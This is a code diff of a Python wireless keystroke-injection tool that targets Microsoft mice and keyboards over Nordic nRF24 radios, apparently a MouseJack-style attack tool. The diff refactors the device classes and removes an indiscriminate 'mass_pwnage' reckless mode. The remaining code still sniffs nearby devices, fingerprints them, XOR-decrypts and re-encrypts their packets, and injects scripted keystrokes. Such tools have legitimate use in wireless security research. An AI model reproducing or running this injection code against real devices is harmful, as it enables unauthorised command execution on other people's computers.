@@ -22,6 +22,12 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
+MS_MOUSE = 1
+MS_MOUSE_ENC = 2
+MS_KEYBOARD_ENC = 3
+LOG_MOUSE = 4
+LOG_KEYBOARD = 5
+
 enable_debug = False
 
 
@@ -286,11 +292,15 @@ class NordicScanner(object):
                         if not self.channels[self.channel_index] in self.devices[a]['channels']:
                             self.devices[a]['channels'].append(self.channels[self.channel_index])
                         # Updates the payload to the longest -- ignores packets len 20 or higher (AES keyboard)
-                        if len(payload) > len(self.devices[a]['payload']) and len(payload) < 20:
+                        if payload and self.fingerprint_device(payload):
+                            self.devices[a]['device'] = self.fingerprint_device(payload)
                             self.devices[a]['payload'] = payload
                     else:
-                        self.devices[a] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload}
+                        self.devices[a] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload, 'device': 0}
                         self.devices[a]['timestamp'] = time.time()
+                        if payload and self.fingerprint_device(payload):
+                            self.devices[a]['device'] = self.fingerprint_device(payload)
+
         except RuntimeError:
             exit(-1)
         return self.devices
@@ -298,10 +308,24 @@ class NordicScanner(object):
     def sniff(self, address):
         self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))
 
+    @staticmethod
+    def fingerprint_device(p):
+        if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
+            # Most likely a non-XOR encrypted Microsoft mouse
+            return MS_MOUSE
+        elif len(p) == 19 and p[0] == 0x0a:
+            # Most likely an XOR encrypted Microsoft mouse
+            return MS_MOUSE_ENC
+        elif len(p) == 16 and p[0] == 0x0a:
+            # Most likely an XOR encrypted Microsoft keyboard
+            return MS_KEYBOARD_ENC
+        else:
+            return 0
 
-class NordicGenericHID(object):
 
-    def __init__(self, radio, address, payload):
+class MicrosoftHID(object):
+
+    def __init__(self, detect, radio, address, payload):
         self.radio = radio
         self.address = address
         self.string_address = self.hexify(address)
@@ -309,11 +333,32 @@ class NordicGenericHID(object):
         self.payload = payload[:]
         self.ack_timeout = 4
         self.retries = 15
-        self.device_type = 'Generic'
-        self.configure()
+        self.device_vendor = 'Microsoft'
 
-    def configure(self):
-        raise NotImplementedError('Not implemented in generic HID')
+        if detect == MS_MOUSE:
+            self.device_type = 2
+            self.encrypted = False
+            self.payload = self.payload.tolist()
+            self.payload[4:6] = [0, 0]
+            self.payload[6] = 67
+        elif detect == MS_MOUSE_ENC:
+            self.device_type = 2
+            self.encrypted = True
+            self.payload = self.xor_crypt(self.payload)
+            self.payload = self.payload.tolist()
+            self.payload[4:6] = [0, 0]
+            self.payload[6] = 67
+        elif detect == MS_KEYBOARD_ENC:
+            self.device_type = 1
+            self.encrypted = True
+            self.payload = self.xor_crypt(self.payload)
+            self.payload = self.payload.tolist()
+            self.payload[4:6] = [0, 0]
+            self.payload[6] = 67
+        else:
+            raise 'Code error - not recognized as MS device'
+
+        self.clear_payload()
 
     def hexify(self, val):
         return ':'.join('{:02X}'.format(b) for b in val)
@@ -331,7 +376,10 @@ class NordicGenericHID(object):
         return p
 
     def serialize_payload(self, p):
-        return str(bytearray(p))
+        if self.encrypted:
+            return str(bytearray(self.xor_crypt(p)))
+        else:
+            return str(bytearray(p))
 
     def checksum(self):
         self.payload[-1] = 0
@@ -347,13 +395,30 @@ class NordicGenericHID(object):
             self.payload[4] += 1
 
     def set_key(self, key):
-        raise NotImplementedError('Not implemented in generic HID')
+        if self.device_type == 1:
+            self.payload[7] = 0
+            self.payload[9] = key['hid']
+            if key['meta']:
+                self.payload[7] |= 0x08
+            if key['shift']:
+                self.payload[7] |= 0x20
+        else:
+            self.payload[7] = 0
+            self.payload[9] = key['hid']
+            if key['meta']:
+                self.payload[7] |= 0x08
+            if key['shift']:
+                self.payload[7] |= 0x02
 
     def clear_payload(self):
-        raise NotImplementedError('Not implemented in generic HID')
+        if self.device_type == 1:
+            self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]
+        else:
+            self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
 
     def post_keystroke_delay(self):
-        pass
+        if self.encrypted:
+            time.sleep(0.005)
 
     def send_key(self, c=None):
         if not c:
@@ -382,102 +447,6 @@ class NordicGenericHID(object):
                     time.sleep(int(c['sleep']) / 1000.0)
 
         self.send_key()
-
-
-class MicrosoftMouseDefaultHID(NordicGenericHID):
-    def configure(self):
-        self.device_type = 'Microsoft Mouse'
-        self.payload = self.payload.tolist()
-        self.payload[4:6] = [0, 0]
-        self.payload[6] = 67
-        self.clear_payload()
-
-    def clear_payload(self):
-        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
-
-    def set_key(self, key):
-        self.payload[7] = 0
-        self.payload[9] = key['hid']
-        if key['meta']:
-            self.payload[7] |= 0x08
-        if key['shift']:
-            self.payload[7] |= 0x02
-
-
-class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
-    def configure(self):
-        self.device_type = 'Microsoft Mouse XOR-Encrypted'
-        self.payload = self.xor_crypt(self.payload)
-        self.payload = self.payload.tolist()
-        self.payload[4:6] = [0, 0]
-        self.payload[6] = 67
-        self.clear_payload()
-
-    def serialize_payload(self, p):
-        # re-encrypt before transmission
-        return str(bytearray(self.xor_crypt(p)))
-
-    def post_keystroke_delay(self):
-        # testing found that encrypted keyboards require a short inter-key delay
-        time.sleep(0.005)
-
-
-class MicrosoftKeyboardEncryptHID(MicrosoftMouseEncryptHID):
-    def configure(self):
-        self.device_type = 'Microsoft Keyboard XOR-Encrypted'
-        self.payload = self.xor_crypt(self.payload)
-        self.payload = self.payload.tolist()
-        self.payload[4:6] = [0, 0]
-        self.payload[6] = 67
-        self.clear_payload()
-
-    def clear_payload(self):
-        self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]
-
-    def set_key(self, key):
-        self.payload[7] = 0
-        self.payload[9] = key['hid']
-        if key['meta']:
-            self.payload[7] |= 0x08
-        if key['shift']:
-            self.payload[7] |= 0x20
-
-
-def fingerprint_device(r, a, p):
-    if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
-        # Most likely a non-XOR encrypted Microsoft mouse
-        return MicrosoftMouseDefaultHID(r, a, p)
-    elif len(p) == 19 and p[0] == 0x0a:
-        # Most likely an XOR encrypted Microsoft mouse
-        return MicrosoftMouseEncryptHID(r, a, p)
-    elif len(p) == 16 and p[0] == 0x0a:
-        # Most likely an XOR encrypted Microsoft keyboard
-        return MicrosoftKeyboardEncryptHID(r, a, p)
-    else:
-        return False
-
-
-def mass_pwnage(r, s, a):
-    while True:
-        print '[+] Scanning...'
-        devices = s.scan(60.0)
-
-        for addr, target in devices.iteritems():
-            payload = target['payload']
-            channels = target['channels']
-            address = target['address']
-
-            print "[+] Found target %s with payload %s" % (addr, s.hexify(payload))
-            s.sniff(address)
-            device = fingerprint_device(r, address, payload)
-
-            if device:
-                for channel in channels:
-                    r.set_channel(channel)
-                    print '[+] Sending attack to %s [%s] on channel %d' % (addr, device.device_type, channel)
-                    device.send_attack(a)
-            else:
-                print "[-] Target %s is not injectable. Skipping..." % (addr)
 
 
 def _debug(debug, text):
@@ -512,8 +481,7 @@ def confirmroot():
 @click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
-@click.option('--reckless', is_flag=True, help='Reckless mode: indiscriminately launch attacks (Caution!)')
-def cli(debug, script, lowpower, interval, reckless):
+def cli(debug, script, lowpower, interval):
 
     banner()
     confirmroot()
@@ -548,13 +516,6 @@ def cli(debug, script, lowpower, interval, reckless):
     # Create scanner instance
     scan = NordicScanner(radio=radio, debug=debug)
 
-    if reckless:
-        if attack == "":
-            print R + "[!} " + W + 'Cannot use reckless mode without attack'
-            exit(-1)
-        else:
-            mass_pwnage(radio, scan, attack)
-
     print G + "[+] " + W + 'Scanning...'
 
     # Enter main loop
@@ -577,10 +538,11 @@ def cli(debug, script, lowpower, interval, reckless):
                         ",".join(str(x) for x in device['channels']),
                         device['count'],
                         str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
+                        device['device'],
                         scan.hexify(device['payload'])
                     ])
 
-                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "PACKET"])
+                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"])
         except KeyboardInterrupt:
             print ""
 
@@ -616,9 +578,15 @@ def cli(debug, script, lowpower, interval, reckless):
             payload = target['payload']
             channels = target['channels']
             address = target['address']
+            device_type = target['device']
 
             scan.sniff(address)
-            device = fingerprint_device(radio, address, payload)
+            device_type = NordicScanner.fingerprint_device(payload)
+            if device_type == MS_MOUSE or device_type == MS_MOUSE_ENC or device_type == MS_KEYBOARD_ENC:
+                device = MicrosoftHID(device_type, radio, address, payload)
+            elif device_type == LOG_MOUSE or device_type == LOG_KEYBOARD:
+                # TODO: Add logitech code
+                device = None
 
             if device:
                 for channel in channels:
